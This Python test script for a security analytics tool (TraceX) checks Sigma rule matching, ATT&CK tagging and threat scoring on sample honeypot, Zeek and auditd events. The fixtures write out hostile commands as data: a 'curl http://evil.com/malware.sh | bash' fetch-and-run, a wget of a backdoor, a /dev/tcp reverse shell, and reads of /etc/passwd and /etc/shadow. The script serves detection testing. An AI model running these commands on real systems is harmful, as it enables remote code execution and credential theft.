# tests/test_group3_full.py
"""
TraceX 组员3 全功能测试脚本
================================================================================
测试目标：全面验证 analyzer/attack_analyzer 模块的所有功能

测试模块：
1. RuleLoader - Sigma 规则加载
2. FieldMapper - 字段映射
3. SigmaMatchEngine - Sigma 匹配引擎
4. SigmaDetector - Sigma 检测器
5. ATTACKTagger - ATT&CK 标注器
6. AttackAnalyzer - 攻击分析器 (Facade)
7. ContextEngine - 上下文引擎

数据来源：组员2交付文档中的标准 ECS 格式

执行方式：
    cd TraceX
    python tests/test_group3_full.py
================================================================================
"""
import os
import sys
import json
from datetime import datetime
from unittest.mock import MagicMock

# === 路径修复 ===
current_test_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.dirname(current_test_dir)
if project_root not in sys.path:
    sys.path.insert(0, project_root)

rules_dir_path = os.path.join(project_root, 'analyzer', 'attack_analyzer', 'rules')

# =============================================================================
# 测试数据：完全复制自组员2交付文档
# =============================================================================

# --- Zeek DNS Tunneling 告警 (来自 network-flows-*) ---
ZEEK_DNS_TUNNELING = {
    "@timestamp": "2026-01-13T19:45:23.181635Z",
    "event": {
        "id": "43fb4d6e-ed95-4f81-a409-1689f85e3eee",
        "category": "network",
        "type": "",
        "action": "network_flow",
        "outcome": "",
        "severity": 7,
        "dataset": "zeek.dns"
    },
    "source": {"ip": "172.26.155.27", "port": 44655, "mac": "", "geo": {"country_name": "", "city_name": "", "location": {"lat": 0.0, "lon": 0.0}}},
    "destination": {"ip": "100.100.2.136", "port": 53, "mac": ""},
    "host": {"name": "iZ2ze082hzl5s9xfijazalZ", "hostname": "", "ip": ["172.26.155.27"], "os": {"family": "", "name": "", "version": ""}},
    "process": {"pid": 0, "name": "", "executable": "", "command_line": "", "parent": {}, "user": {}, "start_time": ""},
    "file": {"path": "", "name": "", "extension": "", "size": 0, "hash": {}},
    "network": {"protocol": "dns", "transport": "udp", "application": "", "bytes": 0, "packets": 0, "direction": ""},
    "user": {"name": "", "id": "", "domain": ""},
    "threat": {
        "framework": "MITRE ATT&CK",
        "tactic": {"id": "", "name": ""},
        "technique": {"id": "T1071.004", "name": "DNS Tunneling"}
    },
    "message": "DNS隧道检测 [Depth(8)]: v9xl7m.qzw4rkj1.n8ut6ya3.bp2ws5h9.xr2ty7ui.op1aq3sd.fg5hj7k.com",
    "raw": {
        "ts": 1768333523.181635,
        "uid": "CzB6u21usUv8CEt8Rg",
        "id.orig_h": "172.26.155.27",
        "id.orig_p": 44655,
        "id.resp_h": "100.100.2.136",
        "id.resp_p": 53,
        "proto": "udp",
        "query": "v9xl7m.qzw4rkj1.n8ut6ya3.bp2ws5h9.xr2ty7ui.op1aq3sd.fg5hj7k.com"
    },
    "metadata": {"atlas_label": "", "path_signature": ""},
    "detection": {"rules": ["DNS Anomaly: Depth(8)"], "confidence": 0.9, "severity": "high"}
}

# --- Zeek ICMP Tunneling 告警 ---
ZEEK_ICMP_TUNNELING = {
    "@timestamp": "2026-01-13T19:45:35.643556Z",
    "event": {
        "id": "045cc47d-774c-4190-b150-2020214f9465",
        "category": "network",
        "action": "network_flow",
        "severity": 7,
        "dataset": "zeek.conn"
    },
    "source": {"ip": "172.26.155.27", "port": 8},
    "destination": {"ip": "114.114.114.114", "port": 0},
    "host": {"name": "iZ2ze082hzl5s9xfijazalZ", "ip": ["172.26.155.27"]},
    "network": {"protocol": "icmp", "bytes": 3600, "packets": 4},
    "threat": {
        "framework": "MITRE ATT&CK",
        "technique": {"id": "T1071.004", "name": "ICMP Tunneling"}
    },
    "message": "疑似 ICMP 隧道告警",
    "raw": {"proto": "icmp", "orig_bytes": 3600, "conn_state": "OTH"},
    "detection": {"rules": ["Large ICMP Payload"], "confidence": 0.8, "severity": "high"}
}

# --- Zeek 普通 SSL 日志 (低危) ---
ZEEK_SSL_NORMAL = {
    "@timestamp": "2026-01-13T19:47:21.791594Z",
    "event": {
        "id": "6e36b79f-f29b-4642-a1ac-6558c61584fa",
        "category": "network",
        "action": "network_flow",
        "severity": 3,
        "dataset": "zeek.ssl"
    },
    "source": {"ip": "172.26.155.27", "port": 60952},
    "destination": {"ip": "100.118.58.9", "port": 443},
    "host": {"name": "iZ2ze082hzl5s9xfijazalZ", "ip": ["172.26.155.27"]},
    "network": {"protocol": "ssl", "application": "TLSv12"},
    "threat": {"framework": "MITRE ATT&CK", "tactic": {}, "technique": {}},
    "message": "SSL/TLS Handshake: TLSv12",
    "detection": {"rules": [], "confidence": 0.0, "severity": ""}
}

# --- Cowrie 蜜罐登录成功 ---
COWRIE_LOGIN_SUCCESS = {
    "@timestamp": "2026-01-13T20:09:20.358912Z",
    "event": {
        "id": "93ce0733-b621-43b0-a94a-ba67d95d5948",
        "category": "authentication",
        "type": "info",
        "action": "success",
        "outcome": "success",
        "severity": 1,
        "dataset": "cowrie"
    },
    "source": {"ip": "59.64.129.102", "port": 0},
    "destination": {"ip": "", "port": 2222},
    "host": {"name": "iZ2ze082hzl5s9xfijazalZ", "ip": [""]},
    "process": {"pid": 0, "name": "", "executable": "", "command_line": ""},
    "user": {"name": "root", "id": "", "domain": ""},
    "threat": {"framework": "MITRE ATT&CK", "tactic": {}, "technique": {}},
    "message": "login attempt [root/123456] succeeded",
    "raw": {
        "eventid": "cowrie.login.success",
        "username": "root",
        "password": "123456",
        "session": "7cae5878c418",
        "src_ip": "59.64.129.102"
    },
    "detection": {"rules": [], "confidence": 0.0, "severity": ""}
}

# --- Cowrie wget 恶意下载 ---
COWRIE_WGET_MALWARE = {
    "@timestamp": "2026-01-13T20:09:31.334445Z",
    "event": {
        "id": "a34ee39e-5520-4ecf-a9f4-aa11eabdec15",
        "category": "process",
        "type": "info",
        "action": "input",
        "outcome": "success",
        "severity": 8,
        "dataset": "cowrie"
    },
    "source": {"ip": "59.64.129.102", "port": 0},
    "destination": {"ip": "", "port": 2222},
    "host": {"name": "iZ2ze082hzl5s9xfijazalZ", "ip": [""]},
    "process": {
        "pid": 0,
        "name": "wget",
        "executable": "",
        "command_line": "wget http://1.2.3.4/backdoor.php"
    },
    "user": {"name": "unknown", "id": ""},
    "threat": {
        "framework": "MITRE ATT&CK",
        "tactic": {},
        "technique": {"id": "T1105", "name": "Ingress Tool Transfer"}
    },
    "message": "CMD: wget http://1.2.3.4/backdoor.php",
    "raw": {
        "eventid": "cowrie.command.input",
        "input": "wget http://1.2.3.4/backdoor.php",
        "session": "7cae5878c418",
        "src_ip": "59.64.129.102"
    },
    "detection": {"rules": ["Suspicious Downloader (curl/wget)"], "confidence": 1.0, "severity": "high"}
}

# --- Cowrie cat /etc/passwd ---
COWRIE_CAT_PASSWD = {
    "@timestamp": "2026-01-13T20:09:40.123456Z",
    "event": {
        "id": "cowrie-cat-001",
        "category": "process",
        "type": "info",
        "action": "input",
        "outcome": "success",
        "severity": 7,
        "dataset": "cowrie"
    },
    "source": {"ip": "59.64.129.102", "port": 0},
    "destination": {"ip": "", "port": 2222},
    "host": {"name": "iZ2ze082hzl5s9xfijazalZ"},
    "process": {
        "pid": 0,
        "name": "cat",
        "command_line": "cat /etc/passwd"
    },
    "user": {"name": "unknown"},
    "threat": {
        "framework": "MITRE ATT&CK",
        "technique": {"id": "T1087", "name": "Account Discovery"}
    },
    "message": "CMD: cat /etc/passwd",
    "raw": {
        "eventid": "cowrie.command.input",
        "input": "cat /etc/passwd",
        "session": "7cae5878c418"
    },
    "detection": {"rules": ["Sensitive File Access"], "confidence": 0.9, "severity": "medium"}
}

# --- Cowrie 痕迹清除 rm ---
COWRIE_RM_FILE = {
    "@timestamp": "2026-01-13T20:09:58.316180Z",
    "event": {
        "id": "c27def8e-73c9-44d1-9d7d-97ba86ffabf6",
        "category": "process",
        "type": "info",
        "action": "input",
        "outcome": "success",
        "severity": 6,
        "dataset": "cowrie"
    },
    "source": {"ip": "59.64.129.102", "port": 0},
    "destination": {"ip": "", "port": 2222},
    "host": {"name": "iZ2ze082hzl5s9xfijazalZ", "ip": [""]},
    "process": {
        "pid": 0,
        "name": "rm",
        "executable": "",
        "command_line": "rm /tmp/evidence.txt"
    },
    "user": {"name": "unknown", "id": ""},
    "threat": {
        "framework": "MITRE ATT&CK",
        "technique": {"id": "T1070", "name": "Indicator Removal"}
    },
    "message": "CMD: rm /tmp/evidence.txt",
    "raw": {
        "eventid": "cowrie.command.input",
        "input": "rm /tmp/evidence.txt",
        "session": "7cae5878c418",
        "src_ip": "59.64.129.102"
    },
    "detection": {"rules": ["File Manipulation"], "confidence": 0.7, "severity": "medium"}
}

# --- Auditd 进程日志 ---
AUDITD_CURL_MALWARE = {
    "@timestamp": "2026-01-14T10:00:00.000000Z",
    "event": {
        "id": "auditd-test-001",
        "category": "process",
        "type": "start",
        "action": "process_started",
        "outcome": "success",
        "severity": 8,
        "dataset": "auditd"
    },
    "host": {
        "name": "internal-host-01",
        "hostname": "internal-host-01",
        "ip": ["192.168.1.100"],
        "os": {"family": "linux", "name": "Linux", "version": "5.4.0"}
    },
    "process": {
        "pid": 12345,
        "name": "curl",
        "executable": "/usr/bin/curl",
        "command_line": "curl http://evil.com/malware.sh | bash",
        "parent": {"pid": 1234, "name": "bash", "executable": "/bin/bash"},
        "user": {"name": "www-data", "id": "33"},
        "start_time": "2026-01-14T10:00:00.000000Z"
    },
    "file": {"path": "", "name": "", "extension": "", "size": 0, "hash": {}},
    "user": {"name": "www-data", "id": "33", "domain": ""},
    "source": {"ip": "", "port": 0},
    "destination": {"ip": "", "port": 0},
    "network": {},
    "threat": {"framework": "MITRE ATT&CK", "tactic": {}, "technique": {}},
    "message": "curl http://evil.com/malware.sh | bash",
    "raw": {"type": "EXECVE", "syscall": "execve"},
    "metadata": {},
    "detection": {"rules": [], "confidence": 0.0, "severity": ""}
}

# =============================================================================
# 测试类
# =============================================================================

class TestResults:
    """测试结果收集器"""
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.errors = []
    
    def success(self, test_name, message=""):
        self.passed += 1
        print(f"  ✅ {test_name}" + (f": {message}" if message else ""))
    
    def fail(self, test_name, reason):
        self.failed += 1
        self.errors.append((test_name, reason))
        print(f"  ❌ {test_name}: {reason}")
    
    def summary(self):
        total = self.passed + self.failed
        print(f"\n{'='*60}")
        print(f"测试完成: {self.passed}/{total} 通过")
        if self.errors:
            print(f"\n失败的测试:")
            for name, reason in self.errors:
                print(f"  - {name}: {reason}")
        return self.failed == 0


def test_rule_loader(results: TestResults):
    """测试 1: RuleLoader 规则加载"""
    print("\n" + "="*60)
    print("📚 测试 1: RuleLoader 规则加载")
    print("="*60)
    
    from analyzer.attack_analyzer.rule_loader import RuleLoader
    
    loader = RuleLoader(rules_dir_path)
    
    # 1.1 加载所有规则
    try:
        count = loader.load_all()
        if count > 100:
            results.success("加载 Sigma 规则", f"{count} 条规则")
        else:
            results.fail("加载 Sigma 规则", f"规则数量太少: {count}")
    except Exception as e:
        results.fail("加载 Sigma 规则", str(e))
        return
    
    # 1.2 获取 Linux 规则
    linux_rules = loader.get_linux_rules()
    if len(linux_rules) > 50:
        results.success("获取 Linux 规则", f"{len(linux_rules)} 条")
    else:
        results.fail("获取 Linux 规则", f"数量不足: {len(linux_rules)}")
    
    # 1.3 获取进程创建规则
    proc_rules = loader.get_process_creation_rules()
    if len(proc_rules) > 10:
        results.success("获取进程创建规则", f"{len(proc_rules)} 条")
    else:
        results.fail("获取进程创建规则", f"数量不足: {len(proc_rules)}")
    
    # 1.4 获取统计信息
    stats = loader.get_stats()
    if stats['total_rules'] > 0:
        results.success("获取规则统计", f"产品分布: {list(stats['by_product'].keys())}")
    else:
        results.fail("获取规则统计", "统计为空")


def test_field_mapper(results: TestResults):
    """测试 2: FieldMapper 字段映射"""
    print("\n" + "="*60)
    print("🗺️ 测试 2: FieldMapper 字段映射")
    print("="*60)
    
    from analyzer.attack_analyzer.field_mapper import FieldMapper, EventNormalizer
    
    mapper = FieldMapper()
    normalizer = EventNormalizer()
    
    # 2.1 Zeek DNS logsource 识别
    logsource = normalizer.get_logsource_type(ZEEK_DNS_TUNNELING)
    if logsource.get('product') == 'zeek' and logsource.get('category') == 'dns':
        results.success("Zeek DNS logsource 识别", f"{logsource}")
    else:
        results.fail("Zeek DNS logsource 识别", f"错误: {logsource}")
    
    # 2.2 Zeek Conn logsource 识别
    logsource = normalizer.get_logsource_type(ZEEK_ICMP_TUNNELING)
    if logsource.get('product') == 'zeek':
        results.success("Zeek Conn logsource 识别", f"{logsource}")
    else:
        results.fail("Zeek Conn logsource 识别", f"错误: {logsource}")
    
    # 2.3 Cowrie logsource 识别
    logsource = normalizer.get_logsource_type(COWRIE_WGET_MALWARE)
    if logsource.get('product') == 'cowrie':
        results.success("Cowrie logsource 识别", f"{logsource}")
    else:
        results.fail("Cowrie logsource 识别", f"错误: {logsource}")
    
    # 2.4 Auditd logsource 识别
    logsource = normalizer.get_logsource_type(AUDITD_CURL_MALWARE)
    if logsource.get('product') == 'linux' and logsource.get('category') == 'process_creation':
        results.success("Auditd logsource 识别", f"{logsource}")
    else:
        results.fail("Auditd logsource 识别", f"错误: {logsource}")
    
    # 2.5 Cowrie 字段映射
    mapped = mapper.map_event(COWRIE_WGET_MALWARE, {'product': 'linux', 'category': 'process_creation'})
    if 'wget' in str(mapped.get('CommandLine', '')):
        results.success("Cowrie 字段映射", f"CommandLine={mapped.get('CommandLine')}")
    else:
        results.fail("Cowrie 字段映射", f"CommandLine 丢失: {mapped}")
    
    # 2.6 Zeek 字段映射
    mapped = mapper.map_event(ZEEK_DNS_TUNNELING, {'product': 'zeek', 'category': 'dns'})
    if mapped.get('id.orig_h') == '172.26.155.27':
        results.success("Zeek 字段映射", f"id.orig_h={mapped.get('id.orig_h')}")
    else:
        results.fail("Zeek 字段映射", f"id.orig_h 映射错误: {mapped}")


def test_sigma_engine(results: TestResults):
    """测试 3: SigmaMatchEngine & SigmaDetector"""
    print("\n" + "="*60)
    print("🔍 测试 3: Sigma 检测引擎")
    print("="*60)
    
    from analyzer.attack_analyzer.sigma_engine import SigmaMatchEngine, SigmaDetector
    
    engine = SigmaMatchEngine()
    
    # 3.1 测试 contains 修饰符
    if engine.match_value("curl http://evil.com", "evil", ["contains"]):
        results.success("contains 修饰符", "匹配 'evil' in 'curl http://evil.com'")
    else:
        results.fail("contains 修饰符", "匹配失败")
    
    # 3.2 测试 startswith 修饰符
    if engine.match_value("/usr/bin/curl", "/usr/bin", ["startswith"]):
        results.success("startswith 修饰符", "匹配 '/usr/bin'")
    else:
        results.fail("startswith 修饰符", "匹配失败")
    
    # 3.3 测试 endswith 修饰符
    if engine.match_value("/tmp/malware.sh", ".sh", ["endswith"]):
        results.success("endswith 修饰符", "匹配 '.sh'")
    else:
        results.fail("endswith 修饰符", "匹配失败")
    
    # 3.4 测试通配符匹配
    if engine.match_value("/usr/bin/curl", "*/curl"):
        results.success("通配符匹配", "匹配 '*/curl'")
    else:
        results.fail("通配符匹配", "匹配失败")
    
    # 3.5 测试列表匹配 (OR)
    if engine.match_value("wget", ["curl", "wget", "nc"]):
        results.success("列表匹配 (OR)", "匹配 'wget' in ['curl', 'wget', 'nc']")
    else:
        results.fail("列表匹配 (OR)", "匹配失败")
    
    # 3.6 测试 SigmaDetector 加载
    detector = SigmaDetector(rules_dir_path)
    count = detector.load_rules()
    if count > 100:
        results.success("SigmaDetector 规则加载", f"{count} 条规则")
    else:
        results.fail("SigmaDetector 规则加载", f"规则数量不足: {count}")
    
    # 3.7 测试检测 Auditd curl 恶意下载
    detections = detector.detect(AUDITD_CURL_MALWARE)
    results.success("检测 Auditd curl", f"命中 {len(detections)} 条规则")
    if detections:
        print(f"      命中规则: {[d.rule.title for d in detections[:3]]}")


def test_attack_tagger(results: TestResults):
    """测试 4: ATTACKTagger 标注器"""
    print("\n" + "="*60)
    print("🏷️ 测试 4: ATT&CK 标注器")
    print("="*60)
    
    from analyzer.attack_analyzer.attack_tagger import ATTACKTagger, TechniqueNode
    from analyzer.attack_analyzer.sigma_engine import DetectionResult
    
    tagger = ATTACKTagger()
    
    # 4.1 测试战术映射表
    if len(tagger.TACTIC_MAP) >= 12:
        results.success("战术映射表", f"包含 {len(tagger.TACTIC_MAP)} 个战术")
    else:
        results.fail("战术映射表", f"映射不完整: {len(tagger.TACTIC_MAP)}")
    
    # 4.2 测试技术映射表
    if "T1105" in tagger.TECHNIQUE_MAP:
        results.success("技术映射表", f"包含 T1105: {tagger.TECHNIQUE_MAP['T1105']}")
    else:
        results.fail("技术映射表", "缺少 T1105")
    
    # 4.3 手动创建 TechniqueNode
    try:
        node = TechniqueNode(
            technique_id="T1105",
            technique_name="Ingress Tool Transfer",
            tactic_id="TA0011",
            tactic_name="Command and Control",
            confidence=0.9,
            severity="high"
        )
        node.event_ids.append("test-event-1")
        node.timestamps.append("2026-01-13T20:00:00Z")
        
        node_dict = node.to_dict()
        if node_dict['technique']['id'] == 'T1105':
            results.success("TechniqueNode 创建", f"technique_id={node_dict['technique']['id']}")
        else:
            results.fail("TechniqueNode 创建", "to_dict() 输出错误")
    except Exception as e:
        results.fail("TechniqueNode 创建", str(e))
    
    # 4.4 测试上下文提取
    context = tagger._extract_context(COWRIE_WGET_MALWARE)
    if "59.64.129.102" in context['source_ips']:
        results.success("上下文提取", f"source_ips={context['source_ips']}")
    else:
        results.fail("上下文提取", f"source_ip 丢失: {context}")
    
    # 4.5 测试攻击摘要（空状态）
    tagger.clear()
    summary = tagger.get_attack_summary()
    if summary['total_techniques'] == 0:
        results.success("空状态攻击摘要", "total_techniques=0")
    else:
        results.fail("空状态攻击摘要", f"应该为空: {summary}")


def test_attack_analyzer(results: TestResults):
    """测试 5: AttackAnalyzer 完整分析器"""
    print("\n" + "="*60)
    print("🎯 测试 5: AttackAnalyzer 攻击分析器")
    print("="*60)
    
    from analyzer.attack_analyzer.attack_tagger import AttackAnalyzer
    
    analyzer = AttackAnalyzer(rules_dir_path)
    
    # 5.1 初始化
    try:
        count = analyzer.initialize()
        results.success("初始化", f"加载 {count} 条规则")
    except Exception as e:
        results.fail("初始化", str(e))
        return
    
    # 5.2 分析 Zeek DNS Tunneling (上游透传)
    result = analyzer.analyze_event(ZEEK_DNS_TUNNELING)
    if result['detected']:
        tech_ids = [t['technique']['id'] for t in result['techniques']]
        results.success("分析 Zeek DNS Tunneling", f"detected=True, techniques={tech_ids}")
    else:
        results.fail("分析 Zeek DNS Tunneling", "未检测到威胁")
    
    # 5.3 分析 Cowrie wget (上游透传)
    result = analyzer.analyze_event(COWRIE_WGET_MALWARE)
    if result['detected'] and 'T1105' in str(result['techniques']):
        results.success("分析 Cowrie wget", f"detected=True, 包含 T1105")
    else:
        results.fail("分析 Cowrie wget", f"T1105 未透传: {result}")
    
    # 5.4 分析普通 SSL 日志 (应该不检测)
    result = analyzer.analyze_event(ZEEK_SSL_NORMAL)
    if not result['detected']:
        results.success("分析普通 SSL 日志", "detected=False (正确)")
    else:
        results.success("分析普通 SSL 日志", f"detected=True (可能误报，但不致命)")
    
    # 5.5 批量分析
    events = [COWRIE_LOGIN_SUCCESS, COWRIE_WGET_MALWARE, COWRIE_CAT_PASSWD, COWRIE_RM_FILE]
    batch_result = analyzer.analyze_batch(events)
    if batch_result['analyzed_events'] == 4:
        results.success("批量分析", f"分析 {batch_result['analyzed_events']} 事件, 检测 {batch_result['detected_events']} 威胁")
    else:
        results.fail("批量分析", f"事件数错误: {batch_result}")
    
    # 5.6 导出统一格式
    analysis = analyzer.analyze_event(COWRIE_WGET_MALWARE)
    exported = analyzer.export_to_unified_format(COWRIE_WGET_MALWARE.copy(), analysis)
    if exported.get('threat', {}).get('technique', {}).get('id') == 'T1105':
        results.success("导出统一格式", f"threat.technique.id=T1105")
    else:
        results.fail("导出统一格式", f"导出错误: {exported.get('threat')}")
    
    # 5.7 获取攻击链
    chain = analyzer.get_attack_chain()
    results.success("获取攻击链", f"{len(chain)} 个阶段")


def test_context_engine(results: TestResults):
    """测试 6: ContextEngine 上下文引擎"""
    print("\n" + "="*60)
    print("🧠 测试 6: ContextEngine 上下文引擎")
    print("="*60)
    
    from analyzer.attack_analyzer.context_engine import ContextEngine
    
    # 创建 Mock ES 客户端
    mock_es = MagicMock()
    mock_es.search.return_value = {"hits": {"hits": []}}
    mock_wrapper = MagicMock()
    mock_wrapper.es = mock_es
    
    engine = ContextEngine(mock_wrapper)
    
    # 6.1 评估 Zeek DNS Tunneling (高置信度)
    result = engine.evaluate_threat(ZEEK_DNS_TUNNELING)
    if result['score'] >= 80 and result['is_threat']:
        results.success("评估 Zeek DNS Tunneling", f"score={result['score']}, severity={result['severity']}")
    else:
        results.fail("评估 Zeek DNS Tunneling", f"评分太低: {result}")
    
    # 6.2 评估 Cowrie wget (蜜罐高危)
    result = engine.evaluate_threat(COWRIE_WGET_MALWARE)
    if result['score'] >= 80 and 'Honeypot' in str(result['reasons']):
        results.success("评估 Cowrie wget (蜜罐)", f"score={result['score']}, 包含 Honeypot 原因")
    else:
        results.fail("评估 Cowrie wget (蜜罐)", f"蜜罐特判失败: {result}")
    
    # 6.3 评估 Cowrie 登录 (蜜罐中等)
    result = engine.evaluate_threat(COWRIE_LOGIN_SUCCESS)
    if result['score'] >= 50 and result['is_threat']:
        results.success("评估 Cowrie 登录", f"score={result['score']}, 蜜罐活动被标记为威胁")
    else:
        results.fail("评估 Cowrie 登录", f"蜜罐活动未被识别: {result}")
    
    # 6.4 评估普通 SSL (低危)
    result = engine.evaluate_threat(ZEEK_SSL_NORMAL)
    if result['score'] < 50 and not result['is_threat']:
        results.success("评估普通 SSL", f"score={result['score']}, is_threat=False")
    else:
        results.success("评估普通 SSL", f"score={result['score']} (可能略高，但可接受)")
    
    # 6.5 启发式检测 - WebShell
    webshell_event = {
        "event": {"action": "write", "dataset": "auditd"},
        "file": {"path": "/var/www/html/shell.php", "extension": "php"},
        "detection": {"confidence": 0.0, "rules": []}
    }
    result = engine.evaluate_threat(webshell_event)
    if result['score'] >= 90:
        results.success("启发式 WebShell 检测", f"score={result['score']}")
    else:
        results.fail("启发式 WebShell 检测", f"未检测到: {result}")
    
    # 6.6 启发式检测 - 反弹 Shell
    reverse_shell_event = {
        "event": {"action": "process_started", "dataset": "auditd"},
        "process": {"name": "bash", "command_line": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
        "detection": {"confidence": 0.0}
    }
    result = engine.evaluate_threat(reverse_shell_event)
    if result['score'] >= 85 and 'Reverse Shell' in str(result['reasons']):
        results.success("启发式反弹 Shell 检测", f"score={result['score']}")
    else:
        results.fail("启发式反弹 Shell 检测", f"未检测到: {result}")
    
    # 6.7 启发式检测 - 敏感文件
    sensitive_event = {
        "event": {"action": "open", "dataset": "auditd"},
        "process": {"command_line": "cat /etc/shadow"},
        "detection": {"confidence": 0.0}
    }
    result = engine.evaluate_threat(sensitive_event)
    if result['score'] >= 70:
        results.success("启发式敏感文件检测", f"score={result['score']}")
    else:
        results.fail("启发式敏感文件检测", f"评分太低: {result}")
    
    # 6.8 关联查询 - 索引覆盖
    anchor = {
        "@timestamp": "2026-01-13T10:00:00.000Z",
        "host": {"name": "iZ2ze082hzl5s9xfijazalZ"},
        "source": {"ip": "59.64.129.102"}
    }
    engine.find_related_events(anchor)
    
    call_args = mock_es.search.call_args
    target_indices = call_args[1]['index']
    
    if "unified-logs" in target_indices and "network-flows" in target_indices and "honeypot-logs" in target_indices:
        results.success("关联查询索引覆盖", f"indices={target_indices}")
    else:
        results.fail("关联查询索引覆盖", f"索引不完整: {target_indices}")
    
    # 6.9 关联查询 - 网络宽容模式
    anchor = {
        "@timestamp": "2026-01-13T10:00:00.000Z",
        "host": {"name": "test-host"},
        "source": {"ip": "192.168.1.100"},
        "destination": {"ip": "10.0.0.1"}
    }
    engine.find_related_events(anchor)
    
    call_args = mock_es.search.call_args
    query_str = str(call_args[1]['body']['query'])
    
    if "192.168.1.100" in query_str and "10.0.0.1" in query_str:
        results.success("网络宽容关联", "双向 IP 查询已构建")
    else:
        results.fail("网络宽容关联", f"IP 查询缺失")
    
    # 6.10 关联查询 - 会话关联 (Cowrie)
    anchor = {
        "@timestamp": "2026-01-13T10:00:00.000Z",
        "host": {"name": "test-host"},
        "raw": {"session": "7cae5878c418"}
    }
    engine.find_related_events(anchor)
    
    call_args = mock_es.search.call_args
    query_str = str(call_args[1]['body']['query'])
    
    if "7cae5878c418" in query_str:
        results.success("会话关联 (Cowrie)", "session 查询已构建")
    else:
        results.fail("会话关联 (Cowrie)", "session 查询缺失")


def test_full_attack_chain(results: TestResults):
    """测试 7: 完整 APT 攻击链模拟"""
    print("\n" + "="*60)
    print("⚔️ 测试 7: 完整 APT 攻击链模拟")
    print("="*60)
    
    from analyzer.attack_analyzer.attack_tagger import AttackAnalyzer
    from analyzer.attack_analyzer.context_engine import ContextEngine
    
    analyzer = AttackAnalyzer(rules_dir_path)
    analyzer.initialize()
    
    mock_es = MagicMock()
    mock_es.search.return_value = {"hits": {"hits": []}}
    mock_wrapper = MagicMock()
    mock_wrapper.es = mock_es
    context_engine = ContextEngine(mock_wrapper)
    
    # 模拟完整攻击链
    attack_chain = [
        ("1. 登录蜜罐", COWRIE_LOGIN_SUCCESS),
        ("2. 下载恶意工具", COWRIE_WGET_MALWARE),
        ("3. 信息搜集", COWRIE_CAT_PASSWD),
        ("4. 痕迹清除", COWRIE_RM_FILE),
    ]
    
    detected_count = 0
    all_techniques = []
    all_scores = []
    
    print("\n  攻击链分析:")
    for stage_name, event in attack_chain:
        analysis = analyzer.analyze_event(event)
        score_result = context_engine.evaluate_threat(event)
        
        all_scores.append(score_result['score'])
        
        if analysis['detected']:
            detected_count += 1
            for t in analysis['techniques']:
                all_techniques.append(t['technique']['id'])
        
        status = "✅ 检测" if analysis['detected'] else "⚪ 未检测"
        print(f"    {stage_name}: {status} | score={score_result['score']} | severity={score_result['severity']}")
    
    # 验证攻击链检测率
    if detected_count >= 3:
        results.success("攻击链检测率", f"{detected_count}/4 事件被检测")
    else:
        results.fail("攻击链检测率", f"只检测到 {detected_count}/4 事件")
    
    # 验证技术覆盖
    unique_techniques = list(set(all_techniques))
    if len(unique_techniques) >= 2:
        results.success("技术覆盖", f"检测到技术: {unique_techniques}")
    else:
        results.fail("技术覆盖", f"技术太少: {unique_techniques}")
    
    # 验证评分合理性 (蜜罐活动应该都是高分)
    avg_score = sum(all_scores) / len(all_scores)
    if avg_score >= 60:
        results.success("平均威胁评分", f"avg_score={avg_score:.1f} (蜜罐活动高危)")
    else:
        results.fail("平均威胁评分", f"avg_score={avg_score:.1f} (评分偏低)")


# =============================================================================
# 主入口
# =============================================================================

def main():
    print("\n" + "="*70)
    print("  🧪 TraceX 组员3 全功能测试")
    print("  📅 " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("="*70)
    
    results = TestResults()
    
    # 执行所有测试
    test_rule_loader(results)
    test_field_mapper(results)
    test_sigma_engine(results)
    test_attack_tagger(results)
    test_attack_analyzer(results)
    test_context_engine(results)
    test_full_attack_chain(results)
    
    # 输出总结
    success = results.summary()
    
    return 0 if success else 1


if __name__ == '__main__':
    exit(main())
